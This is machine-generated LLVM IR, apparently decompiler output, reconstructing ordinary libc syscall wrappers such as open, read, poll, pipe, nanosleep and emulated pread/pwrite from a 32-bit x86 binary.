define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe14 = load i32, i32* @ebx, align 4
  store i32 %v0_804fe14, i32* %stack_var_-4, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804fe27 = call i32 @nanosleep(i32 %v0_804fe14, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804fe27, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804fe27, -4095
  br i1 %tmp, label %dec_label_pc_804fe40, label %dec_label_pc_804fe34

dec_label_pc_804fe34:                             ; preds = %entry
  %v0_804fe34 = load i32, i32* %stack_var_-4, align 4
  %v1_804fe34 = call i32 @__errno_location(i32 %v0_804fe34)
  %v0_804fe39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe39 = sub i32 0, %v0_804fe39
  %v2_804fe3b = inttoptr i32 %v1_804fe34 to i32*
  store i32 %v1_804fe39, i32* %v2_804fe3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fe40

dec_label_pc_804fe40:                             ; preds = %entry, %dec_label_pc_804fe34
  %v0_804fe41 = phi i32 [ %v4_804fe27, %entry ], [ -1, %dec_label_pc_804fe34 ]
  %v2_804fe44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fe44, i32* @ebx, align 4
  ret i32 %v0_804fe41

; uselistorder directives
  uselistorder i32 %v4_804fe27, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fe40, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fe48 = load i32, i32* @edi, align 4
  %v0_804fe4b = load i32, i32* @ebx, align 4
  %v4_804fe4f = sext i8 %arg2 to i32
  store i32 %v4_804fe4f, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_804fe57 = and i8 %arg2, 64
  %v3_804fe57 = icmp eq i8 %v2_804fe57, 0
  br i1 %v3_804fe57, label %dec_label_pc_804fe68, label %dec_label_pc_804fe5c

dec_label_pc_804fe5c:                             ; preds = %entry
  br label %dec_label_pc_804fe68

dec_label_pc_804fe68:                             ; preds = %entry, %dec_label_pc_804fe5c
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fe73 = call i32 @open(i32 %v0_804fe4b)
  store i32 %v1_804fe73, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fe73, -4095
  br i1 %tmp, label %dec_label_pc_804fe8b, label %dec_label_pc_804fe7f

dec_label_pc_804fe7f:                             ; preds = %dec_label_pc_804fe68
  %v1_804fe7f = call i32 @__errno_location(i32 %v0_804fe4b)
  %v0_804fe84 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe84 = sub i32 0, %v0_804fe84
  %v2_804fe86 = inttoptr i32 %v1_804fe7f to i32*
  store i32 %v1_804fe84, i32* %v2_804fe86, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fe8b

dec_label_pc_804fe8b:                             ; preds = %dec_label_pc_804fe68, %dec_label_pc_804fe7f
  %v0_804fe8e = phi i32 [ %v1_804fe73, %dec_label_pc_804fe68 ], [ -1, %dec_label_pc_804fe7f ]
  store i32 %v0_804fe4b, i32* @ebx, align 4
  store i32 %v0_804fe48, i32* @edi, align 4
  ret i32 %v0_804fe8e

; uselistorder directives
  uselistorder i32 %v1_804fe73, { 1, 0, 2 }
  uselistorder i32 %v0_804fe4b, { 1, 0, 2 }
  uselistorder i8 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fe8b, { 1, 0 }
  uselistorder label %dec_label_pc_804fe68, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804fea3 = call i32 @__libc_open(i32 %arg1, i8 65, i32 %arg2)
  ret i32 %v4_804fea3
}

define i32 @__GI___libc_open64(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804feb5 = and i8 %arg2, 64
  %v3_804feb5 = icmp eq i8 %v2_804feb5, 0
  br i1 %v3_804feb5, label %dec_label_pc_804fec6, label %dec_label_pc_804feba

dec_label_pc_804feba:                             ; preds = %entry
  br label %dec_label_pc_804fec6

dec_label_pc_804fec6:                             ; preds = %entry, %dec_label_pc_804feba
  %v0_804feca = phi i32 [ 0, %entry ], [ %arg3, %dec_label_pc_804feba ]
  %v4_804fed0 = call i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %v0_804feca)
  ret i32 %v4_804fed0

; uselistorder directives
  uselistorder label %dec_label_pc_804fec6, { 1, 0 }
}

define i32 @__libc_pause() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fedc = load i32, i32* @ebx, align 4
  store i32 %v0_804fedc, i32* %stack_var_-4, align 4
  %v1_804fee5 = call i32 @pause(i32 %v0_804fedc)
  store i32 %v1_804fee5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fee5, -4095
  br i1 %tmp, label %dec_label_pc_804fefc, label %dec_label_pc_804fef0

dec_label_pc_804fef0:                             ; preds = %entry
  %v0_804fef0 = load i32, i32* %stack_var_-4, align 4
  %v1_804fef0 = call i32 @__errno_location(i32 %v0_804fef0)
  %v0_804fef5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fef5 = sub i32 0, %v0_804fef5
  %v2_804fef7 = inttoptr i32 %v1_804fef0 to i32*
  store i32 %v1_804fef5, i32* %v2_804fef7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fefc

dec_label_pc_804fefc:                             ; preds = %entry, %dec_label_pc_804fef0
  %v0_804fefd = phi i32 [ %v1_804fee5, %entry ], [ -1, %dec_label_pc_804fef0 ]
  %v2_804ff00 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ff00, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fefd

; uselistorder directives
  uselistorder i32 %v1_804fee5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fefc, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ff04 = load i32, i32* @edi, align 4
  store i32 %v0_804ff04, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804ff0c = load i32, i32* @ebx, align 4
  %v1_804ff14 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804ff14 = call i32 @pipe([2 x i32] %v1_804ff14)
  store i32 %v0_804ff0c, i32* @ebx, align 4
  store i32 %v2_804ff14, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804ff14, -4095
  br i1 %tmp, label %dec_label_pc_804ff2c, label %dec_label_pc_804ff20

dec_label_pc_804ff20:                             ; preds = %entry
  %v1_804ff20 = call i32 @__errno_location(i32 %v0_804ff0c)
  %v0_804ff25 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ff25 = sub i32 0, %v0_804ff25
  %v2_804ff27 = inttoptr i32 %v1_804ff20 to i32*
  store i32 %v1_804ff25, i32* %v2_804ff27, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ff2c

dec_label_pc_804ff2c:                             ; preds = %entry, %dec_label_pc_804ff20
  %v0_804ff2d = phi i32 [ %v2_804ff14, %entry ], [ -1, %dec_label_pc_804ff20 ]
  %v2_804ff2c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ff2c, i32* @edx, align 4
  %v2_804ff30 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ff30, i32* @edi, align 4
  ret i32 %v0_804ff2d

; uselistorder directives
  uselistorder i32 %v2_804ff14, { 1, 0, 2 }
  uselistorder i32 %v0_804ff0c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ff2c, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ff34 = load i32, i32* @edi, align 4
  store i32 %v0_804ff34, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_804ff44 = load i32, i32* @ebx, align 4
  %v1_804ff45 = inttoptr i32 %tmp4 to %pollfd*
  %v5_804ff4c = call i32 @poll(%pollfd* %v1_804ff45, i32 %tmp3, i32 %tmp)
  store i32 %v0_804ff44, i32* @ebx, align 4
  store i32 %v5_804ff4c, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_804ff4c, -4095
  br i1 %tmp10, label %dec_label_pc_804ff64, label %dec_label_pc_804ff58

dec_label_pc_804ff58:                             ; preds = %entry
  %v1_804ff58 = call i32 @__errno_location(i32 %v0_804ff44)
  %v0_804ff5d = load i32, i32* %edi.global-to-local, align 4
  %v1_804ff5d = sub i32 0, %v0_804ff5d
  %v2_804ff5f = inttoptr i32 %v1_804ff58 to i32*
  store i32 %v1_804ff5d, i32* %v2_804ff5f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ff64

dec_label_pc_804ff64:                             ; preds = %entry, %dec_label_pc_804ff58
  %v0_804ff65 = phi i32 [ %v5_804ff4c, %entry ], [ -1, %dec_label_pc_804ff58 ]
  %v2_804ff64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ff64, i32* @edx, align 4
  %v2_804ff68 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ff68, i32* @edi, align 4
  ret i32 %v0_804ff65

; uselistorder directives
  uselistorder i32 %v5_804ff4c, { 1, 0, 2 }
  uselistorder i32 %v0_804ff44, { 1, 0 }
  uselistorder label %dec_label_pc_804ff64, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_804ff6c = load i32, i32* @ebp, align 4
  %v0_804ff6d = load i32, i32* @edx, align 4
  store i32 %v0_804ff6d, i32* @ebp, align 4
  %v0_804ff6f = load i32, i32* @edi, align 4
  %v0_804ff70 = load i32, i32* @esi, align 4
  %v0_804ff72 = load i32, i32* @ecx, align 4
  store i32 %v0_804ff72, i32* @ebx, align 4
  %v0_804ff77 = load i32, i32* @eax, align 4
  store i32 %v0_804ff77, i32* %stack_var_-60, align 4
  %v4_804ff95 = call i32 @__libc_lseek64(i32 %v0_804ff77, i32 0, i32 0, i32 1)
  %v0_804ff9d = load i32, i32* @edx, align 4
  %v10_804ff9d = icmp eq i32 %v0_804ff9d, -1
  store i32 %v4_804ff95, i32* @esi, align 4
  store i32 %v0_804ff9d, i32* @edi, align 4
  %v1_804ffa4 = icmp eq i1 %v10_804ff9d, false
  br i1 %v1_804ffa4, label %dec_label_pc_804ffab, label %dec_label_pc_804ffa6

dec_label_pc_804ffa6:                             ; preds = %entry
  %v10_804ffa6 = icmp eq i32 %v4_804ff95, -1
  br i1 %v10_804ffa6, label %dec_label_pc_8050025, label %dec_label_pc_804ffab

dec_label_pc_804ffab:                             ; preds = %dec_label_pc_804ffa6, %entry
  store i32 %v0_804ff77, i32* %stack_var_-60, align 4
  %v4_804ffb9 = call i32 @__libc_lseek64(i32 %v0_804ff77, i32 %arg1, i32 %arg2, i32 0)
  %v0_804ffc1 = load i32, i32* @edx, align 4
  %v1_804ffc1 = add i32 %v0_804ffc1, 1
  %v8_804ffc1 = icmp eq i32 %v1_804ffc1, 0
  %v1_804ffc2 = icmp eq i1 %v8_804ffc1, false
  br i1 %v1_804ffc2, label %dec_label_pc_804ffc7, label %dec_label_pc_804ffc4

dec_label_pc_804ffc4:                             ; preds = %dec_label_pc_804ffab
  %v1_804ffc4 = add i32 %v4_804ffb9, 1
  %v8_804ffc4 = icmp eq i32 %v1_804ffc4, 0
  br i1 %v8_804ffc4, label %dec_label_pc_8050025, label %dec_label_pc_804ffc7

dec_label_pc_804ffc7:                             ; preds = %dec_label_pc_804ffc4, %dec_label_pc_804ffab
  %v0_804ffdc = phi i32 [ %v1_804ffc4, %dec_label_pc_804ffc4 ], [ %v4_804ffb9, %dec_label_pc_804ffab ]
  %v12_804ffc7 = icmp eq i32 %arg3, 1
  %v1_804ffcc = icmp eq i1 %v12_804ffc7, false
  %v0_804ffdd = load i32, i32* @ebx, align 4
  store i32 %v0_804ff77, i32* %stack_var_-60, align 4
  br i1 %v1_804ffcc, label %dec_label_pc_804ffdc, label %dec_label_pc_804ffce

dec_label_pc_804ffce:                             ; preds = %dec_label_pc_804ffc7
  %v3_804ffd5 = call i32 @__libc_write(i32 %v0_804ff77, i32 %v0_804ffdd, i32 %v1_804ffc1)
  br label %dec_label_pc_804ffe8

dec_label_pc_804ffdc:                             ; preds = %dec_label_pc_804ffc7
  %v3_804ffe3 = call i32 @__libc_read(i32 %v0_804ff77, i32 %v0_804ffdd, i32 %v0_804ffdc)
  br label %dec_label_pc_804ffe8

dec_label_pc_804ffe8:                             ; preds = %dec_label_pc_804ffce, %dec_label_pc_804ffdc
  %storemerge = phi i32 [ %v3_804ffe3, %dec_label_pc_804ffdc ], [ %v3_804ffd5, %dec_label_pc_804ffce ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804ffed = load i32, i32* %stack_var_-60, align 4
  %v1_804ffed = call i32 @__errno_location(i32 %v0_804ffed)
  %v1_804fff2 = inttoptr i32 %v1_804ffed to i32*
  %v2_804fff2 = load i32, i32* %v1_804fff2, align 4
  store i32 %v1_804ffed, i32* @ebx, align 4
  %v0_804fffc = load i32, i32* @edi, align 4
  %v0_804fffd = load i32, i32* @esi, align 4
  store i32 %v0_804ff77, i32* %stack_var_-60, align 4
  %v4_8050002 = call i32 @__libc_lseek64(i32 %v0_804ff77, i32 %v0_804fffd, i32 %v0_804fffc, i32 0)
  %v0_805000a = load i32, i32* @edx, align 4
  %v8_805000a = icmp eq i32 %v0_805000a, -1
  %v1_805000b = icmp eq i1 %v8_805000a, false
  br i1 %v1_805000b, label %dec_label_pc_805001d, label %dec_label_pc_805000d

dec_label_pc_805000d:                             ; preds = %dec_label_pc_804ffe8
  %v8_805000d = icmp eq i32 %v4_8050002, -1
  %v1_805000e = icmp eq i1 %v8_805000d, false
  br i1 %v1_805000e, label %dec_label_pc_805001d, label %dec_label_pc_8050010

dec_label_pc_8050010:                             ; preds = %dec_label_pc_805000d
  %v0_8050010 = load i32, i32* %ebp.global-to-local, align 4
  %v10_8050010 = icmp eq i32 %v0_8050010, -1
  %v1_8050013 = icmp eq i1 %v10_8050010, false
  br i1 %v1_8050013, label %dec_label_pc_8050025, label %dec_label_pc_8050015

dec_label_pc_8050015:                             ; preds = %dec_label_pc_8050010
  %v1_8050019 = load i32, i32* @ebx, align 4
  %v2_8050019 = inttoptr i32 %v1_8050019 to i32*
  store i32 %v2_804fff2, i32* %v2_8050019, align 4
  br label %dec_label_pc_8050028

dec_label_pc_805001d:                             ; preds = %dec_label_pc_805000d, %dec_label_pc_804ffe8
  %v1_8050021 = load i32, i32* @ebx, align 4
  %v2_8050021 = inttoptr i32 %v1_8050021 to i32*
  store i32 %v2_804fff2, i32* %v2_8050021, align 4
  br label %dec_label_pc_8050028

dec_label_pc_8050025:                             ; preds = %dec_label_pc_8050010, %dec_label_pc_804ffc4, %dec_label_pc_804ffa6
  store i32 -1, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050028

dec_label_pc_8050028:                             ; preds = %dec_label_pc_805001d, %dec_label_pc_8050015, %dec_label_pc_8050025
  %v0_805002b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804ff70, i32* @esi, align 4
  store i32 %v0_804ff6f, i32* @edi, align 4
  store i32 %v0_804ff6c, i32* @ebp, align 4
  ret i32 %v0_805002b

; uselistorder directives
  uselistorder i32 %v2_804fff2, { 1, 0 }
  uselistorder i32 %v0_804ffdd, { 1, 0 }
  uselistorder i32 %v0_804ff9d, { 1, 0 }
  uselistorder i32 %v0_804ff77, { 2, 1, 4, 0, 3, 6, 5, 8, 7 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050028, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ffe8, { 1, 0 }
}

define i32 @__libc_pwrite64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_8050032 = load i32, i32* @esi, align 4
  %v0_8050033 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_805005a = call i32 @__fake_pread_write64(i32 %v0_8050033, i32 %v0_8050032, i32 %arg4, i32 %arg5, i32 1)
  ret i32 %v5_805005a
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_805005f = load i32, i32* @esi, align 4
  %v0_8050060 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_8050087 = call i32 @__fake_pread_write64(i32 %v0_8050060, i32 %v0_805005f, i32 %arg4, i32 %arg5, i32 0)
  ret i32 %v5_8050087

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %v0_805008c = load i32, i32* @ebp, align 4
  %v0_805008d = load i32, i32* @edi, align 4
  %v0_805008e = load i32, i32* @eax, align 4
  store i32 %v0_805008e, i32* @edi, align 4
  %v0_8050090 = load i32, i32* @esi, align 4
  %v0_8050091 = load i32, i32* @edx, align 4
  store i32 %v0_8050091, i32* @esi, align 4
  %v0_8050094 = load i32, i32* @ecx, align 4
  store i32 %v0_8050094, i32* @ebx, align 4
  store i32 %v0_805008e, i32* %stack_var_-44, align 4
  %v3_805009e = call i32 @__GI___libc_lseek(i32 %v0_805008e, i32 0, i32 1)
  %v13_80500aa = icmp eq i32 %v3_805009e, -1
  br i1 %v13_80500aa, label %dec_label_pc_8050109, label %dec_label_pc_80500b1

dec_label_pc_80500b1:                             ; preds = %entry
  %v0_80500b8 = load i32, i32* @edi, align 4
  store i32 %v0_80500b8, i32* %stack_var_-44, align 4
  %v3_80500b9 = call i32 @__GI___libc_lseek(i32 %v0_80500b8, i32 %arg1, i32 0)
  %v8_80500c1 = icmp eq i32 %v3_80500b9, -1
  br i1 %v8_80500c1, label %dec_label_pc_8050109, label %dec_label_pc_80500c4

dec_label_pc_80500c4:                             ; preds = %dec_label_pc_80500b1
  %v12_80500c4 = icmp eq i32 %arg2, 1
  %v1_80500c9 = icmp eq i1 %v12_80500c4, false
  %v0_80500d7 = load i32, i32* @ebx, align 4
  %v0_80500d8 = load i32, i32* @esi, align 4
  %v0_80500d9 = load i32, i32* @edi, align 4
  store i32 %v0_80500d9, i32* %stack_var_-44, align 4
  br i1 %v1_80500c9, label %dec_label_pc_80500d6, label %dec_label_pc_80500cb

dec_label_pc_80500cb:                             ; preds = %dec_label_pc_80500c4
  %v3_80500cf = call i32 @__libc_write(i32 %v0_80500d9, i32 %v0_80500d8, i32 %v0_80500d7)
  br label %dec_label_pc_80500df

dec_label_pc_80500d6:                             ; preds = %dec_label_pc_80500c4
  %v3_80500da = call i32 @__libc_read(i32 %v0_80500d9, i32 %v0_80500d8, i32 %v0_80500d7)
  br label %dec_label_pc_80500df

dec_label_pc_80500df:                             ; preds = %dec_label_pc_80500cb, %dec_label_pc_80500d6
  %storemerge = phi i32 [ %v3_80500da, %dec_label_pc_80500d6 ], [ %v3_80500cf, %dec_label_pc_80500cb ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_80500e4 = load i32, i32* %stack_var_-44, align 4
  %v1_80500e4 = call i32 @__errno_location(i32 %v0_80500e4)
  %v1_80500e9 = inttoptr i32 %v1_80500e4 to i32*
  %v2_80500e9 = load i32, i32* %v1_80500e9, align 4
  store i32 %v2_80500e9, i32* @ebp, align 4
  store i32 %v1_80500e4, i32* @ebx, align 4
  %v0_80500f4 = load i32, i32* @edi, align 4
  store i32 %v0_80500f4, i32* %stack_var_-44, align 4
  %v3_80500f5 = call i32 @__GI___libc_lseek(i32 %v0_80500f4, i32 %v3_805009e, i32 0)
  %v8_80500fd = icmp eq i32 %v3_80500f5, -1
  %v1_80500fe = icmp eq i1 %v8_80500fd, false
  br i1 %v1_80500fe, label %dec_label_pc_8050105, label %dec_label_pc_8050100

dec_label_pc_8050100:                             ; preds = %dec_label_pc_80500df
  %v0_8050100 = load i32, i32* @esi, align 4
  %v10_8050100 = icmp eq i32 %v0_8050100, -1
  %v1_8050103 = icmp eq i1 %v10_8050100, false
  br i1 %v1_8050103, label %dec_label_pc_8050109, label %dec_label_pc_8050105

dec_label_pc_8050105:                             ; preds = %dec_label_pc_8050100, %dec_label_pc_80500df
  %v0_8050105 = load i32, i32* @ebp, align 4
  %v1_8050105 = load i32, i32* @ebx, align 4
  %v2_8050105 = inttoptr i32 %v1_8050105 to i32*
  store i32 %v0_8050105, i32* %v2_8050105, align 4
  %v0_805010f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805010c

dec_label_pc_8050109:                             ; preds = %dec_label_pc_8050100, %dec_label_pc_80500b1, %entry
  br label %dec_label_pc_805010c

dec_label_pc_805010c:                             ; preds = %dec_label_pc_8050105, %dec_label_pc_8050109
  %v0_805010f = phi i32 [ %v0_805010f.pre, %dec_label_pc_8050105 ], [ -1, %dec_label_pc_8050109 ]
  store i32 %v0_8050090, i32* @esi, align 4
  store i32 %v0_805008d, i32* @edi, align 4
  store i32 %v0_805008c, i32* @ebp, align 4
  ret i32 %v0_805010f

; uselistorder directives
  uselistorder i32 %v0_80500d9, { 1, 0, 2 }
  uselistorder i32 %v0_80500d8, { 1, 0 }
  uselistorder i32 %v0_80500d7, { 1, 0 }
  uselistorder i32 %v3_805009e, { 1, 0 }
  uselistorder i32 %v0_805008e, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805010c, { 1, 0 }
  uselistorder label %dec_label_pc_80500df, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8050116 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_8050134 = call i32 @__fake_pread_write(i32 %v0_8050116, i32 %arg4, i32 1)
  ret i32 %v3_8050134
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8050139 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_8050157 = call i32 @__fake_pread_write(i32 %v0_8050139, i32 %arg4, i32 0)
  ret i32 %v3_8050157

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805015c = load i32, i32* @edi, align 4
  store i32 %v0_805015c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805016c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050174 = call i32 @read(i32 %v0_805016c)
  store i32 %v0_805016c, i32* @ebx, align 4
  store i32 %v1_8050174, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050174, -4095
  br i1 %tmp, label %dec_label_pc_805018c, label %dec_label_pc_8050180

dec_label_pc_8050180:                             ; preds = %entry
  %v1_8050180 = call i32 @__errno_location(i32 %v0_805016c)
  %v0_8050185 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050185 = sub i32 0, %v0_8050185
  %v2_8050187 = inttoptr i32 %v1_8050180 to i32*
  store i32 %v1_8050185, i32* %v2_8050187, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805018c

dec_label_pc_805018c:                             ; preds = %entry, %dec_label_pc_8050180
  %v0_805018d = phi i32 [ %v1_8050174, %entry ], [ -1, %dec_label_pc_8050180 ]
  %v2_8050190 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050190, i32* @edi, align 4
  ret i32 %v0_805018d

; uselistorder directives
  uselistorder i32 %v1_8050174, { 1, 0, 2 }
  uselistorder i32 %v0_805016c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805018c, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050194 = load i32, i32* @edi, align 4
  store i32 %v0_8050194, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805019c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80501a4 = call i32 @sched_get_priority_max(i32 %v0_805019c)
  store i32 %v0_805019c, i32* @ebx, align 4
  store i32 %v1_80501a4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80501a4, -4095
  br i1 %tmp, label %dec_label_pc_80501bc, label %dec_label_pc_80501b0

dec_label_pc_80501b0:                             ; preds = %entry
  %v1_80501b0 = call i32 @__errno_location(i32 %v0_805019c)
  %v0_80501b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80501b5 = sub i32 0, %v0_80501b5
  %v2_80501b7 = inttoptr i32 %v1_80501b0 to i32*
  store i32 %v1_80501b5, i32* %v2_80501b7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80501bc

dec_label_pc_80501bc:                             ; preds = %entry, %dec_label_pc_80501b0
  %v0_80501bd = phi i32 [ %v1_80501a4, %entry ], [ -1, %dec_label_pc_80501b0 ]
  %v2_80501c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80501c0, i32* @edi, align 4
  ret i32 %v0_80501bd

; uselistorder directives
  uselistorder i32 %v1_80501a4, { 1, 0, 2 }
  uselistorder i32 %v0_805019c, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_max, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80501bc, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80501c4 = load i32, i32* @edi, align 4
  store i32 %v0_80501c4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80501cc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80501d4 = call i32 @sched_get_priority_min(i32 %v0_80501cc)
  store i32 %v0_80501cc, i32* @ebx, align 4
  store i32 %v1_80501d4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80501d4, -4095
  br i1 %tmp, label %dec_label_pc_80501ec, label %dec_label_pc_80501e0

dec_label_pc_80501e0:                             ; preds = %entry
  %v1_80501e0 = call i32 @__errno_location(i32 %v0_80501cc)
  %v0_80501e5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80501e5 = sub i32 0, %v0_80501e5
  %v2_80501e7 = inttoptr i32 %v1_80501e0 to i32*
  store i32 %v1_80501e5, i32* %v2_80501e7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80501ec

dec_label_pc_80501ec:                             ; preds = %entry, %dec_label_pc_80501e0
  %v0_80501ed = phi i32 [ %v1_80501d4, %entry ], [ -1, %dec_label_pc_80501e0 ]
  %v2_80501f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80501f0, i32* @edi, align 4
  ret i32 %v0_80501ed

; uselistorder directives
  uselistorder i32 %v1_80501d4, { 1, 0, 2 }
  uselistorder i32 %v0_80501cc, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_min, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80501ec, { 1, 0 }
}

